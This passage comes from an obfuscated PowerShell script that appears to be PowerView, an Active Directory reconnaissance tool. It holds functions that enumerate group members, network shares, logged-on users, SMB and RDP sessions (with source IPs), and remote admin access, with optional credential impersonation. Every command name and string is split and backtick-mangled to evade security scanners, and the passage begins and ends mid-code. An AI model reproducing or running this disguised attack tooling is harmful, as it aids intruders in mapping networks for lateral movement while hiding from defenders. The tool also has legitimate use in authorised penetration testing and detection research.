                    ${gROupP`ROV`iD`eR} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${grOuPPr`ov`ider}."PS`BaSE"."IN`Vo`Ke"(("{1}{2}{0}"-f 'rs','M','embe')) | &("{2}{1}{0}"-f 'ch-Object','a','ForE') {

                        ${Me`m`BeR} = &("{2}{1}{0}"-f 'ject','Ob','New-') ("{2}{1}{0}"-f 't','ec','PSObj')
                        ${m`e`MBeR} | &("{0}{2}{1}"-f 'Add-M','er','emb') ("{0}{3}{1}{2}" -f 'Not','proper','ty','e') ("{3}{1}{2}{0}"-f 'e','pute','rNam','Com') ${Co`mP`UTEr}
                        ${ME`mber} | &("{2}{0}{1}{3}"-f'dd','-Mem','A','ber') ("{3}{0}{1}{2}"-f 'tep','roper','ty','No') ("{0}{1}{2}{3}"-f'Gro','u','p','Name') ${GRO`U`pNaMe}

                        ${LOcAlU`S`ER} = ([ADSI]${_})
                        ${A`dspATH} = ${loC`Alu`sEr}.("{2}{1}{0}" -f'eGet','nvok','I').Invoke(("{2}{1}{0}" -f 'th','a','AdsP')).("{0}{2}{1}" -f 'Re','ce','pla').Invoke(("{0}{2}{1}"-f'Wi','T://','nN'), '')
                        ${i`Sgr`Oup} = (${locA`l`Us`Er}."Sch`e`MAC`lASs`NAME" -like ("{0}{1}" -f 'g','roup'))

                        if(( ( Ls  ("VaRIa"+"bL"+"e:v0s")  ).VAlUe::("{0}{1}" -f'Mat','ches').Invoke(${ADs`PATh}, '/'))."c`oUNT" -eq 1) {
                            
                            ${Me`mb`erIs`DoMAIn} = ${TR`UE}
                            ${n`AME} = ${A`Ds`paTH}.("{1}{2}{0}"-f 'ace','R','epl').Invoke('/', '\')
                        }
                        else {
                            
                            ${meMBeris`D`Omain} = ${FAL`Se}
                            ${n`AmE} = ${aD`SPA`TH}.("{3}{0}{1}{2}" -f 'ub','s','tring','S').Invoke(${ADS`patH}.("{2}{1}{0}"-f 'xOf','e','Ind').Invoke('/')+1).("{0}{1}" -f'Repl','ace').Invoke('/', '\')
                        }

                        ${M`em`BEr} | &("{0}{1}{2}"-f 'Ad','d-Mem','ber') ("{3}{0}{1}{2}" -f 'ep','ropert','y','Not') ("{2}{0}{1}{3}"-f'ountN','a','Acc','me') ${NA`mE}
                        ${Me`MbEr} | &("{0}{1}{2}" -f'Ad','d','-Member') ("{2}{1}{0}" -f 'eproperty','t','No') 'SID' ((&("{1}{2}{0}" -f 'Object','N','ew-') ("{3}{1}{6}{8}{9}{10}{12}{5}{7}{4}{2}{11}{0}" -f 'er','tem.','if','Sys','t','tyIde','S','n','ecur','ity.Principa','l.','i','Securi')(${LOCaLu`s`Er}.("{0}{2}{1}"-f'Invok','t','eGe').Invoke(("{1}{2}{0}"-f'D','O','bjectSI')),0))."v`ALuE")
                        ${mE`MBer} | &("{0}{2}{1}" -f 'Ad','r','d-Membe') ("{2}{1}{0}"-f'y','epropert','Not') ("{0}{2}{1}" -f 'IsGr','up','o') ${is`G`Roup}
                        ${ME`Mb`ER} | &("{1}{0}{2}" -f 'e','Add-M','mber') ("{1}{0}{2}{3}" -f'rop','Notep','ert','y') ("{2}{0}{1}"-f'ai','n','IsDom') ${M`EM`BErISdo`MaiN}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${ME`mB`ER}
                    }
                }
                catch {
                    &("{3}{2}{0}{1}"-f 'e-Verbos','e','rit','W') ('[Get-N'+'etLocal'+'GroupM'+'embe'+'r] '+'Er'+'ro'+'r '+'fo'+'r '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if (${loG`OntO`kEn}) {
            &("{3}{1}{4}{0}{2}{5}"-f'oS','ke','el','Invo','-RevertT','f') -TokenHandle ${LOG`onTok`EN}
        }
    }
}


function Ge`T-NeT`sHAre {


    [OutputType({"{3}{0}{1}{2}"-f 'owerVie','w.Sh','areInfo','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(positION = 0, ValuefROmPIPELInE = ${t`Rue}, vAlUefRoMpIpElINEBypROpErtyNaME = ${tr`Ue})]
        [Alias({"{1}{0}"-f 'ostName','H'}, {"{2}{1}{0}"-f 'e','ostnam','dnsh'}, {"{1}{0}" -f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${compUt`e`RnAMe} = ("{1}{2}{0}"-f'alhost','l','oc'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDeN`Ti`Al} =   (  get-ChILdITeM  vARiaBlE:0dSQR  ).vALue::"E`mPtY"
    )

    BEGIN {
        if (${Ps`B`OUNdPAr`A`M`eTErs}[("{1}{0}{2}"-f'edent','Cr','ial')]) {
            ${L`oGO`NToKEn} = &("{6}{3}{1}{2}{0}{5}{4}" -f 's','k','e-U','nvo','rImpersonation','e','I') -Credential ${cR`E`DENtIaL}
        }
    }

    PROCESS {
        ForEach (${cO`M`putER} in ${c`Om`p`UtE`RNaME}) {
            
            ${Q`UERyLe`V`El} = 1
            ${PT`R`iNFO} =  ( gci varIabLE:1v4r ).vaLUE::"z`ero"
            ${E`NTri`esreaD} = 0
            ${tot`Al`Read} = 0
            ${Re`suMe`hANDLE} = 0

            
            ${R`esU`lt} = ${n`eTap`i32}::"net`ShaReE`N`Um"(${C`O`mPu`Ter}, ${quE`R`yLe`VEL}, [ref]${P`T`RiNFo}, -1, [ref]${ent`Ri`eSReAd}, [ref]${T`OTAlre`Ad}, [ref]${R`ESume`hAN`DLE})

            
            ${oF`F`SEt} = ${P`Tr`INfo}.("{1}{0}{2}" -f 'nt','ToI','64').Invoke()

            
            if ((${Res`U`Lt} -eq 0) -and (${OfF`s`Et} -gt 0)) {

                
                ${I`NCR`EM`eNT} = ${S`hArE_in`F`O_1}::("{2}{1}{0}"-f 'tSize','e','G').Invoke()

                
                for (${i} = 0; (${i} -lt ${en`Tri`EsRe`AD}); ${I}++) {
                    
                    ${n`eWIn`Tptr} = &("{3}{2}{0}{1}"-f 'c','t','je','New-Ob') ("{1}{0}{2}" -f 'em','Syst','.Intptr') -ArgumentList ${OFF`SET}
                    ${i`Nfo} = ${n`EwiN`Tp`TR} -as ${SHa`RE_`in`Fo_1}

                    
                    ${Sh`A`RE} = ${I`Nfo} | &("{0}{1}{3}{2}"-f 'Selec','t-','bject','O') ('*')
                    ${s`h`ARe} | &("{0}{1}{2}" -f 'Add','-Memb','er') ("{3}{0}{1}{2}" -f 'pro','per','ty','Note') ("{1}{3}{2}{0}"-f'Name','Co','puter','m') ${c`O`mPUteR}
                    ${SH`ArE}."pSo`Bject"."typE`NaMES".("{1}{0}"-f't','Inser').Invoke(0, ("{4}{0}{1}{5}{2}{3}" -f 'V','i','.Share','Info','Power','ew'))
                    ${of`FSEt} = ${neW`i`NtP`TR}.("{0}{1}" -f 'ToInt','64').Invoke()
                    ${O`Ffs`et} += ${inC`R`E`MENT}
                    ${sH`A`RE}
                }

                
                ${n`ULl} = ${n`e`TAp`I32}::("{0}{2}{3}{1}"-f'Net','Free','ApiBuff','er').Invoke(${p`TRI`NFo})
            }
            else {
                &("{3}{2}{1}{0}" -f'e','Verbos','te-','Wri') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${loGOnTO`k`en}) {
            &("{0}{1}{2}{4}{3}{5}"-f 'Invok','e-Rev','er','Se','tTo','lf') -TokenHandle ${L`OgoNto`KeN}
        }
    }
}


function GeT-`N`ETloGG`E`Don {


    [OutputType({"{2}{0}{5}{4}{3}{1}" -f'owerV','fo','P','In','LoggedOnUser','iew.'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitioN = 0, vALUefroMpipELINE = ${TR`Ue}, ValueFROmpipELINEbypROpErtynAme = ${tR`Ue})]
        [Alias({"{2}{1}{0}"-f 'ame','ostN','H'}, {"{0}{2}{1}" -f'dnshostna','e','m'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coM`PU`TeRNA`Me} = ("{1}{2}{0}"-f 't','loca','lhos'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`eN`TiAL} =   (  get-vARIABLe  0dSqR -vALUeO )::"E`MpTy"
    )

    BEGIN {
        if (${PsBOu`N`DpaRamE`T`ers}[("{1}{2}{0}"-f 'ntial','C','rede')]) {
            ${l`oGON`To`keN} = &("{5}{4}{6}{2}{3}{0}{1}" -f'io','n','rson','at','voke-User','In','Impe') -Credential ${C`Re`deN`TIAL}
        }
    }

    PROCESS {
        ForEach (${co`MP`UTER} in ${CoMpu`TERn`A`ME}) {
            
            ${QueR`y`LEVel} = 1
            ${P`TrIN`Fo} =  (  GEt-vARiAbLe  ("1v4"+"R")  -vALu )::"Ze`RO"
            ${enTRI`Es`R`ead} = 0
            ${toT`ALRE`Ad} = 0
            ${REsum`EhA`NDLe} = 0

            
            ${r`e`SulT} = ${nETap`i`32}::"n`eTwKsTAUsE`RenUm"(${CoM`P`UTer}, ${q`UEr`YL`eVEL}, [ref]${pTR`iNfo}, -1, [ref]${ENTriE`s`ReaD}, [ref]${to`TA`LReaD}, [ref]${resu`mEh`A`NDlE})

            
            ${oF`Fs`ET} = ${p`Tri`Nfo}.("{1}{0}"-f 'oInt64','T').Invoke()

            
            if ((${res`ULT} -eq 0) -and (${oFF`SeT} -gt 0)) {

                
                ${IN`C`REmenT} = ${W`ksta`_usER_I`N`F`o_1}::("{0}{1}{2}"-f'Get','Si','ze').Invoke()

                
                for (${I} = 0; (${i} -lt ${eNt`RIE`SrEAD}); ${i}++) {
                    
                    ${n`ew`iNtptR} = &("{1}{2}{0}{3}"-f 'je','Ne','w-Ob','ct') ("{1}{2}{0}{3}" -f 'm.','S','yste','Intptr') -ArgumentList ${oFf`sET}
                    ${I`NfO} = ${neWi`N`TpTR} -as ${wK`S`T`A_uS`er_`inFo_1}

                    
                    ${LO`GGe`DoN} = ${IN`Fo} | &("{3}{0}{2}{1}" -f 'e','-Object','ct','Sel') ('*')
                    ${LoGge`D`oN} | &("{2}{1}{3}{0}" -f 'r','mb','Add-Me','e') ("{0}{1}{2}{3}"-f'Notepr','ope','r','ty') ("{0}{2}{1}" -f 'Co','uterName','mp') ${coM`p`UtEr}
                    ${loggE`Don}."PsoBJe`Ct"."t`yPen`AmeS".("{1}{0}{2}" -f 'ser','In','t').Invoke(0, ("{1}{3}{5}{4}{0}{2}{6}"-f'ew.L','P','oggedOnUs','o','rVi','we','erInfo'))
                    ${OF`FsET} = ${n`eW`iNt`ptR}.("{1}{2}{0}"-f '64','To','Int').Invoke()
                    ${o`FF`Set} += ${i`Ncre`menT}
                    ${lOGG`ED`On}
                }

                
                ${N`UlL} = ${n`EtAp`I32}::("{4}{0}{1}{2}{3}"-f'etApiBu','ff','erF','ree','N').Invoke(${ptRI`NFO})
            }
            else {
                &("{2}{0}{3}{1}"-f'e-Verb','se','Writ','o') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${Log`O`NTok`EN}) {
            &("{2}{5}{3}{1}{4}{0}"-f'elf','-Rever','In','e','tToS','vok') -TokenHandle ${LOGonT`O`KEn}
        }
    }
}


function gE`T-nEtSE`ssI`On {


    [OutputType({"{1}{0}{2}{3}"-f'werView.Sessio','Po','n','Info'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITIOn = 0, vaLuefrOmpIPEliNE = ${t`RuE}, valuEFrompipELINEByPRopErTYNAMe = ${TR`Ue})]
        [Alias({"{2}{0}{1}"-f 'ostNam','e','H'}, {"{0}{1}{2}{3}"-f'd','ns','hostn','ame'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`mpu`TernA`me} = ("{2}{1}{0}"-f 'st','lho','loca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DE`Nt`ial} =  (  GeT-ChIldIteM  ('Vari'+'Ab'+'Le:0'+'dSQr') ).VaLuE::"eM`pTY"
    )

    BEGIN {
        if (${psB`OUn`D`paRAMETE`RS}[("{0}{1}{2}" -f'Cred','e','ntial')]) {
            ${LOg`O`N`TokeN} = &("{6}{0}{5}{1}{3}{2}{4}"-f'n','ke-Us','r','erImpe','sonation','vo','I') -Credential ${C`R`eDentI`AL}
        }
    }

    PROCESS {
        ForEach (${C`OMPu`TeR} in ${C`Omp`UtERNAMe}) {
            
            ${Quer`yl`e`VEl} = 10
            ${P`T`RinFo} =  ( gI  vArIaBLE:1V4R ).VAlue::"z`eRO"
            ${ENTriEs`R`ead} = 0
            ${TO`TALR`EaD} = 0
            ${RE`sUm`E`hA`NdlE} = 0

            
            ${rES`UlT} = ${net`Ap`I32}::"ne`Ts`ES`S`IoNenuM"(${co`MpUt`er}, '', ${USern`A`mE}, ${qUE`R`y`leVEl}, [ref]${p`TRI`Nfo}, -1, [ref]${E`N`TriE`SrEAd}, [ref]${t`oTA`lread}, [ref]${Re`suMEh`A`NDLe})

            
            ${O`F`FsET} = ${ptrI`NFO}.("{0}{1}" -f'ToI','nt64').Invoke()

            
            if ((${Re`SU`lT} -eq 0) -and (${oF`FSet} -gt 0)) {

                
                ${IN`c`REmENT} = ${ses`SioN`_`Inf`o`_10}::("{0}{2}{1}" -f'Get','ize','S').Invoke()

                
                for (${i} = 0; (${i} -lt ${e`N`T`RIesrEad}); ${i}++) {
                    
                    ${NEWi`N`TpTR} = &("{0}{1}{2}" -f'New','-Ob','ject') ("{0}{3}{2}{1}" -f'System','tptr','In','.') -ArgumentList ${Off`seT}
                    ${i`NFo} = ${new`INT`PTR} -as ${seSs`iO`N_`In`Fo_10}

                    
                    ${SE`SS`iON} = ${in`FO} | &("{1}{0}{2}" -f 't-Obj','Selec','ect') ('*')
                    ${s`es`sIon} | &("{0}{3}{2}{1}"-f'Add-Me','r','be','m') ("{1}{2}{0}"-f'ty','No','teproper') ("{2}{1}{3}{0}" -f 'puterName','o','C','m') ${C`OMpUter}
                    ${sEsS`i`On}."PsoBJ`E`Ct"."t`YpeNAMes".("{0}{1}{2}"-f 'In','s','ert').Invoke(0, ("{2}{1}{0}{3}{6}{4}{5}"-f'Vi','er','Pow','e','onI','nfo','w.Sessi'))
                    ${OFF`s`ET} = ${NEWin`TP`Tr}.("{2}{0}{1}"-f'oInt','64','T').Invoke()
                    ${oFF`Set} += ${i`NCREMe`NT}
                    ${s`e`ssION}
                }

                
                ${N`ULL} = ${N`ETa`P`i32}::("{1}{2}{0}{4}{3}"-f'ff','NetAp','iBu','ee','erFr').Invoke(${p`TRi`Nfo})
            }
            else {
                &("{1}{2}{3}{0}"-f 'se','W','rite','-Verbo') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (${lo`GOntOk`eN}) {
            &("{0}{5}{2}{4}{6}{1}{3}"-f'In','ert','oke-R','ToSelf','e','v','v') -TokenHandle ${LoGonT`o`kEN}
        }
    }
}


function gE`T-`REGl`OgGED`ON {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}"-f'PSSh','ss','oce','ou','ldPr'}, '')]
    [OutputType({"{4}{0}{5}{3}{1}{6}{2}" -f 'erView.','ogge','OnUser','L','Pow','Reg','d'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIon = 0, VAlUefrompipeLine = ${TR`UE}, vAlUEfROmPiPelinebYPROPErTYNamE = ${tr`UE})]
        [Alias({"{1}{0}" -f 'tName','Hos'}, {"{2}{0}{1}{3}" -f'h','o','dns','stname'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMPUTeR`NA`mE} = ("{1}{0}{2}" -f'oc','l','alhost')
    )

    BEGIN {
        if (${P`sBO`Und`PA`R`AmEterS}[("{2}{0}{1}"-f'nt','ial','Crede')]) {
            ${LOgON`T`OkEn} = &("{4}{0}{1}{5}{7}{2}{3}{6}"-f'Us','er','rs','o','Invoke-','I','nation','mpe') -Credential ${C`REden`Ti`AL}
        }
    }

    PROCESS {
        ForEach (${COMP`U`TEr} in ${CO`mpU`TErName}) {
            try {
                
                ${R`Eg} =  (lS VARiABle:F2K  ).vaLUe::("{0}{1}{3}{2}"-f'O','penRemoteBa','Key','se').Invoke(("{0}{1}"-f'Us','ers'), "$ComputerName")

                
                ${r`Eg}.("{1}{0}{2}"-f 'Ke','GetSub','yNames').Invoke() | &("{1}{0}{3}{2}" -f're','Whe','Object','-') { ${_} -match ((('S-'+'1-'+'5-21-['+'0-9]+'+'-'+'[0-'+'9]+-'+'[0-9]'+'+-[0-'+'9]'+'+io'+'0')-crEPlacE ([chAr]105+[chAr]111+[chAr]48),[chAr]36)) } | &("{0}{1}{3}{4}{2}"-f 'Fo','r','-Object','E','ach') {
                    ${U`seR`NAme} = &("{3}{1}{2}{0}"-f'-SID','vertF','rom','Con') -ObjectSID ${_} -OutputType ("{3}{1}{0}{2}"-f'mpl','i','e','DomainS')

                    if (${useRN`AMe}) {
                        ${us`eRNA`Me}, ${UsERDo`mA`in} = ${Us`ErNa`mE}.("{1}{0}"-f'lit','Sp').Invoke('@')
                    }
                    else {
                        ${Us`E`RNaMe} = ${_}
                        ${U`SeRdoma`in} = ${n`ULL}
                    }

                    ${reG`lO`ggED`oNU`SEr} = &("{0}{1}{2}"-f 'N','ew-Obje','ct') ("{0}{1}{2}"-f'PSOb','j','ect')
                    ${ReglOgGED`on`U`ser} | &("{0}{1}{2}" -f'Ad','d-Memb','er') ("{2}{1}{0}"-f'ty','roper','Notep') ("{1}{3}{0}{2}"-f 'puter','Co','Name','m') "$ComputerName"
                    ${RE`G`lOGg`EDoNU`sER} | &("{1}{2}{3}{0}"-f'Member','A','dd','-') ("{0}{2}{1}"-f'Not','y','epropert') ("{2}{1}{0}" -f'n','mai','UserDo') ${UsERd`O`M`Ain}
                    ${R`eg`LoGGEdOnUs`eR} | &("{0}{1}{2}"-f'A','dd-','Member') ("{3}{2}{1}{0}" -f'rty','e','teprop','No') ("{1}{0}"-f'serName','U') ${UsER`Name}
                    ${RE`gL`oggEdOn`USeR} | &("{0}{1}{2}"-f'Add-','Me','mber') ("{0}{1}{2}" -f'Note','prope','rty') ("{0}{1}{2}" -f'User','SI','D') ${_}
                    ${r`Eglo`ggedo`Nu`SEr}."pSOB`JecT"."typE`NAm`ES".("{0}{1}"-f'Ins','ert').Invoke(0, ("{4}{3}{6}{1}{0}{2}{5}" -f 'ew.R','i','egLogg','r','Powe','edOnUser','V'))
                    ${rEg`logge`D`o`NUseR}
                }
            }
            catch {
                &("{0}{2}{3}{1}" -f 'Wri','e','te','-Verbos') ('[G'+'e'+'t-RegLog'+'gedOn] '+'Er'+'ror'+' '+'openin'+'g'+' '+'re'+'mo'+'te '+'r'+'egi'+'stry '+'on'+' '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${L`OG`ONto`ken}) {
            &("{0}{1}{3}{2}" -f'Invoke-Re','ve','elf','rtToS') -TokenHandle ${logOn`T`Ok`en}
        }
    }
}


function ge`T-neTr`DPSes`SION {


    [OutputType({"{5}{3}{6}{0}{1}{4}{2}" -f 'D','PS','ionInfo','Vie','ess','Power','w.R'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITION = 0, ValuefroMPiPELINE = ${TR`UE}, VaLUefrOmPiPeLineBYpROpErtyNaMe = ${T`RuE})]
        [Alias({"{1}{2}{0}"-f 'ame','Host','N'}, {"{0}{2}{1}"-f'd','name','nshost'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OMpUt`ErnA`mE} = ("{1}{3}{0}{2}" -f'lh','lo','ost','ca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDe`NTI`AL} =  (GeT-VaRiaBle  0Dsqr  ).vALuE::"eMP`Ty"
    )

    BEGIN {
        if (${pS`Bo`U`NDP`AR`AMETeRS}[("{0}{2}{1}" -f'Creden','ial','t')]) {
            ${lo`Go`Nt`oKEn} = &("{0}{2}{5}{3}{1}{4}" -f'Invoke','personatio','-U','Im','n','ser') -Credential ${cr`ed`enTial}
        }
    }

    PROCESS {
        ForEach (${Co`mpU`Ter} in ${CO`MpUTERN`Ame}) {

            
            ${han`D`lE} = ${w`TSAp`I32}::("{3}{0}{4}{2}{1}" -f'T','erEx','rv','W','SOpenSe').Invoke(${CO`MPUt`er})

            
            if (${HAN`D`le} -ne 0) {

                
                ${pP`S`essIoniNfo} =  (  CHIldITEm  VariaBLe:1v4r ).vAluE::"Ze`Ro"
                ${P`cO`UNT} = 0

                
                ${reSU`LT} = ${WT`sAp`i`32}::"WT`S`ENu`merat`EsesSIoNSex"(${han`dLE}, [ref]1, 0, [ref]${PPSESS`iO`Ni`NFo}, [ref]${pCOU`Nt});${LAs`T`ERror} =   (  Get-cHILdiTEm  ("VariAble:9"+"1y"+"P")).VaLUe::("{0}{3}{1}{2}{4}" -f'Get','i','n32E','LastW','rror').Invoke()

                
                ${O`FfS`eT} = ${PpsES`sIoNi`N`FO}.("{2}{0}{1}" -f'o','Int64','T').Invoke()

                if ((${REsU`lt} -ne 0) -and (${o`Ffs`Et} -gt 0)) {

                    
                    ${i`NC`REmENt} = ${wtS`_sESsi`o`N_`InFO`_1}::("{0}{1}"-f 'GetS','ize').Invoke()

                    
                    for (${I} = 0; (${i} -lt ${pcO`U`NT}); ${i}++) {

                        
                        ${n`eWi`NTptr} = &("{1}{0}{2}" -f 'ew-Obj','N','ect') ("{2}{0}{1}"-f 'm.In','tptr','Syste') -ArgumentList ${Off`SEt}
                        ${i`NfO} = ${nEW`iN`Tp`Tr} -as ${WtS_sESSIO`N_I`N`FO_1}

                        ${RdpS`EsS`ioN} = &("{3}{2}{0}{1}" -f 'w-O','bject','e','N') ("{2}{1}{0}"-f't','ec','PSObj')

                        if (${I`NFO}."phOstN`A`me") {
                            ${RDP`sEs`SI`on} | &("{0}{1}{2}" -f 'Add-Me','mb','er') ("{0}{1}{2}" -f 'Notepro','p','erty') ("{0}{1}{2}"-f'Com','put','erName') ${i`NFO}."P`hOsTnA`ME"
                        }
                        else {
                            
                            ${RdpS`ES`sION} | &("{1}{0}{2}" -f 'dd-Mem','A','ber') ("{0}{2}{1}"-f'Not','property','e') ("{0}{2}{1}"-f'Compute','ame','rN') ${cO`mP`Uter}
                        }

                        ${Rdp`SE`SsiOn} | &("{0}{2}{1}" -f'Ad','-Member','d') ("{1}{0}{2}{3}"-f 'teprope','No','rt','y') ("{1}{0}{2}" -f'sionNam','Ses','e') ${I`Nfo}."P`s`es`sIoNNaME"

                        if ($(-not ${i`Nfo}."pd`OmainN`AME") -or (${IN`FO}."pdomaI`N`N`AmE" -eq '')) {
                            
                            ${rd`pSEs`siON} | &("{3}{0}{2}{1}" -f 'd','ember','-M','Ad') ("{1}{0}{2}{3}"-f 'rop','Notep','ert','y') ("{1}{2}{0}"-f'me','Us','erNa') "$($Info.pUserName)"
                        }
                        else {
                            ${RdP`s`ESSiON} | &("{2}{0}{1}"-f 'e','mber','Add-M') ("{0}{1}{2}{3}"-f'Not','eproper','t','y') ("{2}{0}{1}"-f'Na','me','User') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${r`dPs`Es`sION} | &("{0}{3}{2}{1}"-f 'A','r','Membe','dd-') ("{0}{1}{2}{3}" -f'No','tepro','pert','y') 'ID' ${iN`FO}."SeS`sIo`NId"
                        ${r`dpSEsSi`on} | &("{0}{1}{2}" -f'A','dd-','Member') ("{2}{1}{0}" -f 'y','rt','Noteprope') ("{0}{1}"-f'Sta','te') ${In`FO}."st`AtE"

                        ${pPB`Uff`eR} =   (  variable  ("1"+"v4R")  -vaLu  )::"Ze`Ro"
                        ${pBy`TES`RET`Ur`Ned} = 0

                        
                        
                        ${RE`Su`lT2} = ${W`Ts`ApI32}::"wtSQUEr`ySe`sS`ioNiNf`O`R`MaTioN"(${hAn`D`Le}, ${I`NFo}."Se`sSi`onId", 14, [ref]${pPbUf`Fer}, [ref]${pbytES`REt`U`RNED});${l`ASterro`R2} =   $91YP::("{0}{2}{3}{1}" -f 'GetLa','n32Error','stW','i').Invoke()

                        if (${R`ESuLT2} -eq 0) {
                            &("{2}{0}{3}{1}"-f'e-Ve','se','Writ','rbo') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${Off`sEt2} = ${PpB`UF`FER}.("{0}{2}{1}" -f'ToIn','64','t').Invoke()
                            ${neW`iNTp`Tr2} = &("{2}{1}{0}" -f 'ect','Obj','New-') ("{0}{2}{1}"-f 'S','Intptr','ystem.') -ArgumentList ${ofF`sE`T2}
                            ${INF`o2} = ${Ne`wiN`TpT`R2} -as ${W`Ts_cLi`E`Nt_AddrEsS}

                            ${sO`U`RCeIp} = ${iNf`O2}."aD`Dr`Ess"
                            if (${sOuR`CE`IP}[2] -ne 0) {
                                ${Sou`Rc`Eip} = [String]${soUrCe`iP}[2]+'.'+[String]${so`Urce`Ip}[3]+'.'+[String]${sO`U`R`cEip}[4]+'.'+[String]${sO`U`RCEip}[5]
                            }
                            else {
                                ${so`URCe`IP} = ${n`Ull}
                            }

                            ${RDp`se`sSi`on} | &("{1}{0}{2}" -f'be','Add-Mem','r') ("{0}{1}{2}" -f'Notep','ropert','y') ("{1}{2}{0}" -f'IP','Sourc','e') ${SoUR`CeiP}
                            ${RdpsE`Ss`iON}."P`S`ObJECT"."T`y`peNamEs".("{0}{2}{1}"-f 'In','t','ser').Invoke(0, ("{2}{3}{0}{6}{5}{1}{4}" -f 'e','sio','PowerV','i','nInfo','PSes','w.RD'))
                            ${R`DPSESS`ION}

                            
                            ${nu`ll} = ${wt`Sapi32}::("{0}{2}{1}"-f 'WT','y','SFreeMemor').Invoke(${Ppb`U`FFeR})

                            ${o`FF`seT} += ${IN`CrE`mEnt}
                        }
                    }
                    
                    ${nu`ll} = ${wt`sA`pI32}::("{3}{1}{0}{4}{2}"-f 'reeM','F','moryEx','WTS','e').Invoke(2, ${pP`sessIonin`FO}, ${PC`Ount})
                }
                else {
                    &("{1}{3}{4}{2}{0}" -f 'e','W','bos','rit','e-Ver') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                ${n`ULL} = ${Wt`sapi`32}::("{1}{2}{0}"-f'ver','W','TSCloseSer').Invoke(${h`AnDLe})
            }
            else {
                &("{1}{0}{2}{3}"-f 'i','Wr','te-Ve','rbose') ('['+'Get-NetRD'+'PSess'+'ion'+'] '+'Error'+' '+'o'+'p'+'ening '+'the'+' '+'Remot'+'e'+' '+'D'+'esk'+'top '+'Ses'+'si'+'on '+'Hos'+'t '+'(R'+'D '+'Ses'+'sion '+'H'+'ost) '+'server'+' '+'f'+'or: '+"$ComputerName")
            }
        }
    }

    END {
        if (${loGO`N`ToKEn}) {
            &("{1}{3}{4}{0}{2}"-f 'rtToSe','Inv','lf','o','ke-Reve') -TokenHandle ${lOGOnt`o`KEn}
        }
    }
}


function tesT-`AdM`i`N`AcceSS {


    [OutputType({"{0}{6}{4}{5}{3}{2}{1}"-f'PowerV','s','ces','.AdminAc','e','w','i'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITiOn = 0, VaLuefrompiPelINE = ${t`RUE}, vAlUEFrOMpIPElInEByprOPeRtYNAMe = ${TR`Ue})]
        [Alias({"{1}{0}"-f 'ostName','H'}, {"{2}{0}{1}{3}" -f 'h','o','dns','stname'}, {"{1}{0}" -f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COM`p`U`Ter`NAME} = ("{0}{3}{2}{1}"-f'loca','st','o','lh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREde`NT`IAl} =  (GET-VaRiAbLE ("0"+"DSQr")  -vaLueO )::"EMp`Ty"
    )

    BEGIN {
        if (${PS`BOUnDPaR`Amete`Rs}[("{2}{0}{1}"-f 'tia','l','Creden')]) {
            ${LO`gONTOK`EN} = &("{4}{1}{5}{3}{2}{0}"-f'nation','pe','o','s','Invoke-UserIm','r') -Credential ${c`RedE`NTIaL}
        }
    }

    PROCESS {
        ForEach (${cOmPU`T`eR} in ${cOmp`Uter`NamE}) {
            
            
            ${HA`Ndle} = ${ADVA`PI`32}::("{0}{3}{2}{1}{4}"-f 'OpenSCM','er','ag','an','W').Invoke("\\$Computer", ("{3}{0}{1}{2}"-f 'ervicesA','c','tive','S'), 0xF003F);${la`St`eRRoR} =   (VariAble  ("91"+"Yp") -Val )::("{5}{0}{4}{2}{1}{3}"-f'etL','W','st','in32Error','a','G').Invoke()

            ${IS`AD`MiN} = &("{1}{2}{0}" -f'ject','New-','Ob') ("{0}{1}"-f'PS','Object')
            ${iSa`DmIn} | &("{0}{2}{1}{3}"-f'Add','e','-M','mber') ("{3}{0}{1}{2}" -f 'ep','rope','rty','Not') ("{2}{1}{0}" -f 'e','am','ComputerN') ${co`M`p`UtEr}

            
            if (${HAN`d`le} -ne 0) {
                ${NU`Ll} = ${aD`VapI`32}::("{3}{0}{4}{1}{2}{5}"-f 'os','rvi','ceHan','Cl','eSe','dle').Invoke(${h`A`NDLE})
                ${Isa`dm`iN} | &("{0}{2}{3}{1}" -f'Add-','er','M','emb') ("{0}{2}{1}" -f'N','operty','otepr') ("{0}{1}"-f'IsAd','min') ${tR`UE}
            }
            else {
